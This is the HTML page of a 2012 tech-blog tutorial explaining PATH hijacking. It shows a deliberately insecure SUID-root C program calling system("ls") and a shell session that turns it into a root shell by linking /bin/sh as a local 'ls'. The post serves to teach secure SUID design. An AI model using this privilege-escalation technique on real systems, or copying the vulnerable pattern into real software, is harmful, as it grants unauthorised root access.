<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!--[if lt IE 7]>
<html class="no-js lt-ie9 lt-ie8 lt-ie7 ie" lang="en"> <![endif]-->
<!--[if IE 7]>
<html class="no-js lt-ie9 lt-ie8 ie" lang="en"> <![endif]-->
<!--[if IE 8]>
<html class="no-js lt-ie9 ie" lang="en"> <![endif]-->
<!--[if gt IE 8]><!-->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" class="no-js"><!--<![endif]-->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>ROSEdu Techblog - Exploiting environment variables</title>
    <link rel="stylesheet" href="./css/style.css" type="text/css">
    <link rel="stylesheet" href="./css/rosedu_links.css" type="text/css">
    <link rel="stylesheet" href="./css/syntax.css" type="text/css">

    <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

    <script type="text/javascript">
      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-7579199-6']);
      _gaq.push(['_trackPageview']);

      (function () {
        var ga = document.createElement('script');
        ga.type = 'text/javascript';
        ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(ga, s);
      })();
    </script>
  </head>

  <body>
    <div id="page" class="hentry">
      <header class="the-header">
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <nav class="nav-global">
              <ul>
                <li class="logo"><a href="./" title="Home">ROSEdu Techblog</a></li>
                <li class="about"><a href="./about.html">About</a></li>
                <li class="people"><a href="./people.html">People</a></li>
                <li class="archive"><a href="./archive.html">Archive</a></li>
                <li class="category"><a href="./tags.html">Tags</a></li>
              </ul>
            </nav>

            <hr />

            <nav class="nav-global">
              <ul>
                <li class="logo"><a href="./archive.html" title="Archive">Latest Posts</a></li>
                
                  <li><a href="./cdl-2015.html" title="Application process for the Community Development Lab">Application pro...</a></li>
                
                  <li><a href="./fp-dragons.html" title="Here be Dragons - The Interesting Realm of Floating Point Operations">Here be Dragons...</a></li>
                
                  <li><a href="./daemonizing-processes.html" title="Daemonizing Processes - Part 1">Daemonizing Pro...</a></li>
                
              </ul>
            </nav>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <div class="body" role="main">
        <div class="unit-body">
          <div class="unit-inner unit-body-inner">
            <div class="entry-content">
              <article class="unit-article layout-post">
                <div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="./exploiting-environment-variables.html" title="Exploiting environment variables">Exploiting environment variables</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on March 27, 2012</span>
      by
      <span class="author"><a href="./people/alexandru-juncu.html">Alexandru Juncu</a></span>
      </span>

      <br />
      <span class="meta">
        Tagged:
        <span class="tags"><a title="All pages tagged 'exploit'." href="./tags/exploit.html">exploit</a>, <a title="All pages tagged 'PATH'." href="./tags/path.html">PATH</a></span>
      </span>

      

      <p>Environment variables are sometimes very important when creating new processes. For example, the <code>PATH</code> variable, that decides what executable to run.</p>
<!--more-->
<p>The easiest example to exploit <code>PATH</code> is to add the current directory <code>.</code> to the list and overwrite common shell commands with something else.</p>
<pre><code>$ cat ./ls
echo P0wn3d
$ ls
file1 file2
$ ./ls
P0wn3d
$ export PATH=.:$PATH
$ ls
P0wn3d</code></pre>
<p>But that can only affect the user’s shell and can’t do harm to the system. What if some other conditions exist in the system, like the use of the <code>SUID</code> bit. Normal processes are run as the user who executes them, regardless of who owns the executable file (as long as the user who runs the file can read the file). If the <code>SUID</code> is set on an executable file, any process started from that executable will run as the owner of the file, not shell owner. Here is an example of a very insecure source that <strong>shouldn’t</strong> be SUID-ed.</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true"></a><span class="dt">int</span> main(<span class="dt">void</span>)</span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true"></a>{</span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true"></a>	system(<span class="st">&quot;ls&quot;</span>);</span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true"></a>	<span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true"></a>}</span></code></pre></div>
<p>Let’s assume that the compiled executable from this code is owned by root, SUID-ed and put into /bin with the name <code>ls_root</code>.</p>
<pre><code>$ ls -la /bin/ls_root
-rwsrwsr-x 1 root root 7163 2012-03-21 12:28 /bin/ls_root</code></pre>
<p>What this will enable, for example, is the listing of the <code>/root</code> directory by any user.</p>
<pre><code>$ cd /root
$ ls
ls: cannot open directory .: Permission denied
$ sudo ls
test
$ ls_root
test</code></pre>
<p>The code simply executes the <code>ls</code> command. But what if the <code>ls</code> command isn’t doing what it is supposed to do? Given this setup, as a normal user, we can do the following:</p>
<pre><code>$ ln -s /bin/sh ls
$ echo $$
32655
$ ls
ls  ls_root.c
$ ./ls
$ echo $$
32730
$ whoami
alexj
$ exit
$ export PATH=.:$PATH
$ ls_root
# whoami
root
#</code></pre>
<p>The <code>ls_root</code> process will run the <code>ls</code> command. The <code>ls</code> command will run an executable specified by the <code>PATH</code> variable (the executable is <code>/bin/ls</code>). But if the <code>PATH</code> variable is changed in the current bash process, the executable ran by the <code>ls</code> command will now become something else. If the <code>ls_root</code> command is ran by root (with the help of the <code>SUID</code> bit), any of its children will also be processes of root. So, if the <code>ls</code> command will now run a bash executable, it will run a root owned executable that leads to root access.</p>
<p>The <code>SUID</code> is something that is used in Linux systems (<code>sudo</code> and even <code>ping</code> use it), but these executables are very carefully implemented so that normal users can’t exploit them.</p>

    </div>
  </div>
</div>

<!-- Social Buttons here -->
<div id="sociallinks">
  <a href="https://twitter.com/home?status=/exploiting-environment-variables.html" target="_blank">Tweet this</a> -
  <a href="http://www.facebook.com/sharer/sharer.php?u=/exploiting-environment-variables.html" target="_blank">Like this</a> -
  <a href="https://plus.google.com/share?url=/exploiting-environment-variables.html" target="_blank">Share on G+</a>
</div>

<script>
  (function(){window.addEventListener("DOMContentLoaded",function(){
    //get URL
    var url=document.location;
    var links=document.getElementById("sociallinks")
                      .getElementsByTagName('a');
    for (var i=0;i!=links.length;i++){
      // Replacing /exploiting-environment-variables.html with current URL
      links[i].setAttribute("href",links[i].href.replace('/exploiting-environment-variables.html',url));
    }})})();
</script>
</br>

<div id="disqus_thread"></div>
<script type="text/javascript">
  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
  var disqus_shortname = 'rosedutechblog';
  var disqus_url = window.location.href.split('/').splice(0,3).join("/")+'/exploiting-environment-variables.html';
  var title = 'Exploiting environment variables';
  /* * * DON'T EDIT BELOW THIS LINE * * */
  (function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

              </article>
              
            </div>
          </div>
        </div>
      </div>

      <footer class="the-footer">
        <div class="unit-foot">
          <div class="unit-inner unit-foot-inner">
            <div class="misc vcard">
              <h4>Social</h4>
              <div class="rss">
                <a href="http://techblog.rosedu.org/rss.xml" target="_blank">
                  <img src="./images/style/rss.png" alt="Subscribe to RSS Feed" />
                </a>
                <a href="http://www.reddit.com/submit?url='+encodeURIComponent(window.location)" target="_blank" onclick="window.location='http://www.reddit.com/submit?url='+encodeURIComponent(window.location); return false">
                  <img src="./images/style/reddit.png" alt="Submit to Reddit" />
                </a>
                <a href="http://twitter.com/share" class="twitter-share-button" data-count="none" target="_blank">
                  <img src="./images/style/twitter.png" alt="Submit to Twitter" />
                </a>
              </div>

              <h4>Tech</h4>
              <div class="bucket">
                This blog is created by <a class="author fn n" href="http://www.rosedu.org">ROSEdu</a> community using <a class="author fn n" href="http://jaspervdj.be/hakyll">Hakyll</a>. See source on <a href="https://github.com/rosedu/techblog">GitHub</a>.
              </div>

              <h4>License</h4>
              <div class="bucket">
                <span>
                  <a rel="license" href="http://creativecommons.org/licenses/by/3.0/" title="Creative Commons Attribution 3.0 License">
                    <img src="//i.creativecommons.org/l/by/3.0/88x31.png" alt="License">
                  </a>
                </span>
                <span>
                  This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/3.0/" class="subfoot">Creative Commons Attribution 3.0 License</a>.
                </span>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  </body>
</html>
